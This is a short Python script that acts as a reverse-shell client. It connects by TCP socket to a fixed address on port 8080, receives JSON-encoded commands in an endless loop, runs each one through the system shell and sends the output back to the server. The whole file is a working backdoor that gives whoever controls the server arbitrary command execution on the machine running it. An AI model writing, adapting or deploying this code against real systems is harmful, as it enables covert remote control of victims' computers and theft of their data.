import socket
import json
from subprocess import check_output

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.102", 8080))


def use_for_system_command(commnd):
    '''define a function'''
    return check_output(commnd, shell=True)


def send_client(data):
        json_data = json.dumps(data)
        encode_data = json_data.encode("utf-8")
        s.send(encode_data)


def reciv_server():
    json_data = s.recv(1024)
    decode_data = json_data.decode("utf-8")
    return json.loads(decode_data)

# def Mainfunction(cmd):
#     send_server(cmd)
#     return reciv_server()


while True:
    # user_cmd = input("Say server:")
    server_data = reciv_server()
    re_d = use_for_system_command(server_data[0])
    send_client(re_d.decode("utf-8"))
    


    # print(type(re_d))
    # print(type(server_data))
    # print(server_data)
    # print(len(server_data))
    # print(server_data[0])










